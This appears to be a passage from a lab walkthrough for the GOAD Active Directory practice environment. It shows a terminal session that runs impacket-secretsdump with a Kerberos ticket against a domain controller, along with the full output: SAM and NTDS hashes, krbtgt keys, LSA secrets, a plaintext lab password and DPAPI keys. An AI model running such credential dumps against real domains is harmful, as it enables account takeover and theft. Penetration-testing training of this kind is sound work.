class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(root㉿kaada)-[/home/kali/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-comment"># export KRB5CCNAME=administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/home/kali/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-comment"># impacket-secretsdump -k -no-pass -dc-ip &#x27;winterfell.north.sevenkingdoms.local&#x27; @&#x27;winterfell.north.sevenkingdoms.local&#x27;</span><br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">14.0</span>.dev0 - <span class="hljs-title class_">Copyright</span> <span class="hljs-title class_">Fortra</span>, <span class="hljs-title class_">LLC</span> <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] <span class="hljs-title class_">Service</span> <span class="hljs-title class_">RemoteRegistry</span> is <span class="hljs-keyword">in</span> stopped state<br>[*] <span class="hljs-title class_">Starting</span> service <span class="hljs-title class_">RemoteRegistry</span><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x5c187ac5247c939e6bc15282bce1e92d</span><br>[*] <span class="hljs-title class_">Dumping</span> local <span class="hljs-title class_">SAM</span> hashes (<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:dbd13e1c4e338284ac4e9874f7de6ef4</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>[*] <span class="hljs-title class_">Dumping</span> cached domain logon information (domain/<span class="hljs-symbol">username:</span>hash)<br>[*] <span class="hljs-title class_">Dumping</span> <span class="hljs-title class_">LSA</span> <span class="hljs-title class_">Secrets</span><br>[*] <span class="hljs-variable">$MACHINE</span>.<span class="hljs-title class_">ACC</span> <br><span class="hljs-title class_">NORTH</span>\<span class="hljs-title class_">WINTERFELL</span><span class="hljs-variable">$:</span><span class="hljs-symbol">plain_password_hex:</span>fd0dd579adf168c6cd4a3813bda4973d25bb8bd798e41c6a2f14de4eb21f1e2e979258e2402d6130460a16eb00827133d0ca596fb2aa503a839dc9e9a7c1a71acc35ee397c99d532d9c992dce4f0391102b1ce574b593d21aa6b51501aed76d3c93b862a51a9a8279e24fd74442cb5690a880d7c419646f0c0950b30bc8cbcd3dcf5785b393a7f9c0b5bcee7c97af2b9971cfd7c2f1c60b8f4da9ff1fdcc5f640a30cc5621a4420b9ee9281edc0eabdd3c04f9072f0adb6d9c6da79a1f0b70ad58d7ef2bd66e48a0e9de750faeebb4c188a522fb8459f218a8af10206addd5e9b4970ebccd286142e84e98375d3d2268<br><span class="hljs-title class_">NORTH</span>\<span class="hljs-title class_">WINTERFELL</span><span class="hljs-variable">$:</span><span class="hljs-symbol">aad3b435b51404eeaad3b435b51404ee:</span>f9a4c95e41bd1238887ce5e7ca12039a:::<br>[*] <span class="hljs-title class_">DefaultPassword</span> <br><span class="hljs-title class_">NORTH</span>\<span class="hljs-symbol">robb.stark:</span>sexywolfy<br>[*] <span class="hljs-title class_">DPAPI_SYSTEM</span> <br><span class="hljs-symbol">dpapi_machinekey:</span><span class="hljs-number">0x97a8af655dda4d3028aa6ca91e43d1033195e014</span><br><span class="hljs-symbol">dpapi_userkey:</span><span class="hljs-number">0xbd0c69088f040653a8eef62ec8be6560ea41f2b8</span><br>[*] <span class="hljs-title class_">NL</span><span class="hljs-variable">$KM</span> <br> <span class="hljs-number">0000</span>   <span class="hljs-title class_">A0</span> <span class="hljs-title class_">B9</span> <span class="hljs-number">07</span> <span class="hljs-number">4</span>A <span class="hljs-number">55</span> <span class="hljs-number">70</span> <span class="hljs-title class_">F9</span> <span class="hljs-title class_">F9</span>  <span class="hljs-title class_">FA</span> <span class="hljs-title class_">CC</span> <span class="hljs-number">68</span> <span class="hljs-number">30</span> <span class="hljs-number">15</span> <span class="hljs-title class_">F5</span> <span class="hljs-number">95</span> <span class="hljs-title class_">A2</span>   ...<span class="hljs-title class_">JUp</span>....h0....<br> <span class="hljs-number">0010</span>   <span class="hljs-number">58</span> <span class="hljs-number">69</span> <span class="hljs-number">29</span> <span class="hljs-title class_">AD</span> <span class="hljs-number">87</span> <span class="hljs-title class_">BA</span> <span class="hljs-title class_">A5</span> <span class="hljs-number">9</span>F  <span class="hljs-number">76</span> <span class="hljs-title class_">EB</span> <span class="hljs-title class_">AC</span> <span class="hljs-title class_">F3</span> <span class="hljs-number">07</span> <span class="hljs-number">63</span> <span class="hljs-number">71</span> <span class="hljs-number">5</span>A   <span class="hljs-title class_">Xi</span>).....v....cqZ<br> <span class="hljs-number">0020</span>   <span class="hljs-title class_">ED</span> <span class="hljs-number">26</span> <span class="hljs-title class_">C1</span> <span class="hljs-title class_">FC</span> <span class="hljs-number">5</span>A <span class="hljs-number">2</span>B <span class="hljs-title class_">D3</span> <span class="hljs-number">25</span>  <span class="hljs-title class_">A0</span> <span class="hljs-number">74</span> <span class="hljs-title class_">E6</span> <span class="hljs-title class_">E4</span> <span class="hljs-number">90</span> <span class="hljs-number">53</span> <span class="hljs-title class_">D5</span> <span class="hljs-number">19</span>   .&amp;..Z+.%.t...S..<br> <span class="hljs-number">0030</span>   <span class="hljs-title class_">E8</span> <span class="hljs-title class_">D6</span> <span class="hljs-title class_">BD</span> <span class="hljs-title class_">D0</span> <span class="hljs-title class_">F3</span> <span class="hljs-number">36</span> <span class="hljs-number">76</span> <span class="hljs-number">5</span>A  <span class="hljs-title class_">A6</span> <span class="hljs-number">74</span> <span class="hljs-number">1</span>B <span class="hljs-number">5</span>B <span class="hljs-title class_">D8</span> <span class="hljs-number">30</span> <span class="hljs-number">90</span> <span class="hljs-number">2</span>A   .....<span class="hljs-number">6</span>vZ.t.[.<span class="hljs-number">0</span>.*<br><span class="hljs-title class_">NL</span><span class="hljs-variable">$KM</span><span class="hljs-symbol">:a0b9074a5570f9f9facc683015f595a2586929ad87baa59f76ebacf30763715aed26c1fc5a2bd325a074e6e49053d519e8d6bdd0f336765aa6741b5bd830902a</span><br>[*] <span class="hljs-title class_">Dumping</span> <span class="hljs-title class_">Domain</span> <span class="hljs-title class_">Credentials</span> (domain\<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br>[*] <span class="hljs-title class_">Using</span> the <span class="hljs-title class_">DRSUAPI</span> method to get <span class="hljs-title class_">NTDS</span>.<span class="hljs-title class_">DIT</span> secrets<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:dbd13e1c4e338284ac4e9874f7de6ef4</span>:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">921</span>fb182cfcf32e3a83332da4ad500b6:::<br><span class="hljs-symbol">vagrant:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:e02bc503339d51f71d913c245d35b50b</span>:::<br><span class="hljs-symbol">arya.stark:</span><span class="hljs-number">1110</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>f622f4cd4284a887228940e2ff4e709:::<br><span class="hljs-symbol">eddard.stark:</span><span class="hljs-number">1111</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:d977b98c6c9282c5c478be1d97b237b8</span>:::<br><span class="hljs-symbol">catelyn.stark:</span><span class="hljs-number">1112</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:cba36eccfd9d949c73bc73715364aff5</span>:::<br><span class="hljs-symbol">robb.stark:</span><span class="hljs-number">1113</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">831486</span>ac7f26860c9e2f51ac91e1a07a:::<br><span class="hljs-symbol">sansa.stark:</span><span class="hljs-number">1114</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:b777555c2e2e3716e075cc255b26c14d</span>:::<br><span class="hljs-symbol">brandon.stark:</span><span class="hljs-number">1115</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">84</span>bbaa1c58b7f69d2192560a3f932129:::<br><span class="hljs-symbol">rickon.stark:</span><span class="hljs-number">1116</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">7978</span>dc8a66d8e480d9a86041f8409560:::<br><span class="hljs-symbol">hodor:</span><span class="hljs-number">1117</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">337</span>d2667505c203904bd899c6c95525e:::<br><span class="hljs-symbol">jon.snow:</span><span class="hljs-number">1118</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:b8d76e56e9dac90539aff05e3ccb1755</span>:::<br><span class="hljs-symbol">samwell.tarly:</span><span class="hljs-number">1119</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f5db9e027ef824d029262068ac826843</span>:::<br><span class="hljs-symbol">jeor.mormont:</span><span class="hljs-number">1120</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span>dccf1c567c56a40e56691a723a49664:::<br><span class="hljs-symbol">sql_svc:</span><span class="hljs-number">1121</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">84</span>a5092f53390ea48d660be52b93b804:::<br><span class="hljs-title class_">WINTERFELL</span><span class="hljs-variable">$:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f9a4c95e41bd1238887ce5e7ca12039a</span>:::<br><span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span><span class="hljs-number">1105</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>dfd2a24c6bff862ced231c6aab1728a:::<br>samaccount<span class="hljs-variable">$:</span><span class="hljs-number">1122</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>eddedc35eb7b7ecde0c9f0564e54c83:::<br><span class="hljs-title class_">SEVENKINGDOMS</span><span class="hljs-variable">$:</span><span class="hljs-number">1104</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:c54199154ad73c3fd01ec9f233dbb1c9</span>:::<br>[*] <span class="hljs-title class_">Kerberos</span> keys grabbed<br><span class="hljs-symbol">Administrator:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972</span><br><span class="hljs-symbol">Administrator:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:bb7b6aed58a7a395e0e674ac76c28aa0</span><br><span class="hljs-symbol">Administrator:</span>des-cbc-<span class="hljs-symbol">md5:</span>fe58cdcd13a43243<br><span class="hljs-symbol">krbtgt:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:db2ad65b1eb1bb5a4fb4b3d55412b102e7deb11cade1166ec9097b9593b56d70</span><br><span class="hljs-symbol">krbtgt:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:c6e4a39a498e405fb41b96564b53caf2</span><br><span class="hljs-symbol">krbtgt:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">753</span>dd6768f103779<br><span class="hljs-symbol">vagrant:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24</span><br><span class="hljs-symbol">vagrant:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>d7c6160ffb016857b9af96c44110ab1<br><span class="hljs-symbol">vagrant:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">16</span>dc9e8ad3dfc47f<br><span class="hljs-symbol">arya.stark:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">2001</span>e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7d<br><span class="hljs-symbol">arya.stark:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">8477</span>cba28e7d7cfe5338d172a23d74df<br><span class="hljs-symbol">arya.stark:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">13525243</span>d6643285<br><span class="hljs-symbol">eddard.stark:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4</span><br><span class="hljs-symbol">eddard.stark:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>f9b06a24b90862367ec221a11f92203<br><span class="hljs-symbol">eddard.stark:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">8067</span>f7abecc7d346<br><span class="hljs-symbol">catelyn.stark:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283</span><br><span class="hljs-symbol">catelyn.stark:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span>ce7e2ad069fa40fb2bc7f5f9643d93<br><span class="hljs-symbol">catelyn.stark:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">6</span>b314670a2f84cfb<br><span class="hljs-symbol">robb.stark:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2a</span><br><span class="hljs-symbol">robb.stark:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:b2965905e68356d63fedd9904357cc42</span><br><span class="hljs-symbol">robb.stark:</span>des-cbc-<span class="hljs-symbol">md5:</span>c4b62c797f5dd01f<br><span class="hljs-symbol">sansa.stark:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:a268e7a385f4f165c6489c18a3bdeb52c5e505050449c6f9aeba4bc06a7fcbed</span><br><span class="hljs-symbol">sansa.stark:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:e2e6e885f6f4d3e25d759ea624961392</span><br><span class="hljs-symbol">sansa.stark:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">4</span>c7c16e3f74cc4d3<br><span class="hljs-symbol">brandon.stark:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span>dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10<br><span class="hljs-symbol">brandon.stark:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span>de3581a163bd056073b71ab23142d73<br><span class="hljs-symbol">brandon.stark:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">76</span>e61fda8a4f5245<br><span class="hljs-symbol">rickon.stark:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">79</span>ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcda<br><span class="hljs-symbol">rickon.stark:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:d4a0669b1eff6caa42f2632ebca8cd8d</span><br><span class="hljs-symbol">rickon.stark:</span>des-cbc-<span class="hljs-symbol">md5:</span>b9ec3b8f2fd9d98a<br><span class="hljs-symbol">hodor:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287</span><br><span class="hljs-symbol">hodor:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">929126</span>dcca8c698230b5787e8f5a5b60<br><span class="hljs-symbol">hodor:</span>des-cbc-<span class="hljs-symbol">md5:</span>d5764373f2545dfd<br><span class="hljs-symbol">jon.snow:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fb<br><span class="hljs-symbol">jon.snow:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:d8bc99ccfebe2d6e97d15f147aa50e8b</span><br><span class="hljs-symbol">jon.snow:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">084358</span>ceb3290d7c<br><span class="hljs-symbol">samwell.tarly:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605</span><br><span class="hljs-symbol">samwell.tarly:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">3943</span>b4ac630b0294d5a4e8b940101fae<br><span class="hljs-symbol">samwell.tarly:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">5</span>efed0e0a45dd951<br><span class="hljs-symbol">jeor.mormont:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50</span><br><span class="hljs-symbol">jeor.mormont:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>b0a98958e19d6092c8e8dc1d25c788b<br><span class="hljs-symbol">jeor.mormont:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">1</span>a68641a3e9bb6ea<br><span class="hljs-symbol">sql_svc:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">24</span>d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6af<br><span class="hljs-symbol">sql_svc:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">01290</span>f5b76c04e39fb2cb58330a22029<br><span class="hljs-symbol">sql_svc:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">8645</span>d5cd402f16c7<br><span class="hljs-title class_">WINTERFELL</span><span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">536</span>f18d284a034da7b3b2773ecd38b290da94cb60b140f3991e2a61d723084c6<br><span class="hljs-title class_">WINTERFELL</span><span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">925</span>b7f6e5fa6fa831d02fefe3f27e927<br><span class="hljs-title class_">WINTERFELL</span><span class="hljs-variable">$:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">67</span>f84098a2c7fe3e<br><span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>db8d97ee33a620d961fe254ab70b6635d184be4c9795ac0244d6e8afb3a1ae6<br><span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">662441</span>eb1d89f45693edda51b1e20aea<br><span class="hljs-title class_">CASTELBLACK</span><span class="hljs-variable">$:</span>des-cbc-<span class="hljs-symbol">md5:</span><span class="hljs-number">5</span>d5ece267919f44c<br>samaccount<span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span>b9a52e2d94aa24dcea3d181001b03380291929a0094fa5b24f44d2a221faa89<br>samaccount<span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">98</span>c00ce456e342106141609163511daa<br>samaccount<span class="hljs-variable">$:</span>des-cbc-<span class="hljs-symbol">md5:</span>f8ab2001bcecc252<br><span class="hljs-title class_">SEVENKINGDOMS</span><span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">685</span>f215e60383f5b4ceab557a475291ced63a62d8b938e743253c1c4d4c72a36<br><span class="hljs-title class_">SEVENKINGDOMS</span><span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">63</span>cb1cb0fe6926ba1a71cff25ad6588b<br><span class="hljs-title class_">SEVENKINGDOMS</span><span class="hljs-variable">$:</span>des-cbc-<span class="hljs-symbol">md5:</span>df23da31739ee90e<br>[*] <span class="hljs-title class_">Cleaning</span> up... <br>[*] <span class="hljs-title class_">Stopping</span> service <span class="hljs-title class_">RemoteRegistry</span><br>[-] <span class="hljs-title class_">SCMR</span> <span class="hljs-symbol">SessionError:</span> <span class="hljs-symbol">code:</span> <span class="hljs-number">0x41b</span> - <span class="hljs-title class_">ERROR_DEPENDENT_SERVICES_RUNNING</span> - A stop control has been sent to a service that other running services are dependent on.<br>[*] <span class="hljs-title class_">Cleaning</span> up... <br>[*] <span class="hljs-title class_">Stopping</span> service <span class="hljs-title class_">RemoteRegistry</span><br><span class="hljs-title class_">Exception</span> ignored <span class="hljs-symbol">in:</span> &lt;function <span class="hljs-title class_">Registry</span>.__del__ at <span class="hljs-number">0x7f9b9dab0900</span>&gt;<br><span class="hljs-title class_">Traceback</span> (most recent call last):<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">172</span>, <span class="hljs-keyword">in</span> __del__<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">169</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py&quot;</span>, line <span class="hljs-number">409</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smbconnection.py&quot;</span>, line <span class="hljs-number">633</span>, <span class="hljs-keyword">in</span> closeFile<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">1357</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">474</span>, <span class="hljs-keyword">in</span> sendSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">443</span>, <span class="hljs-keyword">in</span> signSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/crypto.py&quot;</span>, line <span class="hljs-number">150</span>, <span class="hljs-keyword">in</span> <span class="hljs-title class_">AES_CMAC</span><br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py&quot;</span>, line <span class="hljs-number">228</span>, <span class="hljs-keyword">in</span> new<br><span class="hljs-symbol">KeyError:</span> <span class="hljs-string">&#x27;Cryptodome.Cipher.AES&#x27;</span><br><span class="hljs-title class_">Exception</span> ignored <span class="hljs-symbol">in:</span> &lt;function <span class="hljs-title class_">Registry</span>.__del__ at <span class="hljs-number">0x7f9b9dab0900</span>&gt;<br><span class="hljs-title class_">Traceback</span> (most recent call last):<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">172</span>, <span class="hljs-keyword">in</span> __del__<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/winregistry.py&quot;</span>, line <span class="hljs-number">169</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py&quot;</span>, line <span class="hljs-number">409</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smbconnection.py&quot;</span>, line <span class="hljs-number">633</span>, <span class="hljs-keyword">in</span> closeFile<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">1357</span>, <span class="hljs-keyword">in</span> close<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">474</span>, <span class="hljs-keyword">in</span> sendSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/smb3.py&quot;</span>, line <span class="hljs-number">443</span>, <span class="hljs-keyword">in</span> signSMB<br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/impacket/crypto.py&quot;</span>, line <span class="hljs-number">150</span>, <span class="hljs-keyword">in</span> <span class="hljs-title class_">AES_CMAC</span><br>  <span class="hljs-title class_">File</span> <span class="hljs-string">&quot;/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py&quot;</span>, line <span class="hljs-number">228</span>, <span class="hljs-keyword">in</span> new<br><span class="hljs-symbol">KeyError:</span> <span class="hljs-string">&#x27;Cryptodome.Cipher.AES&#x27;</span><br>                                                                                       <br></code></pre></td></tr></table></figure>
+
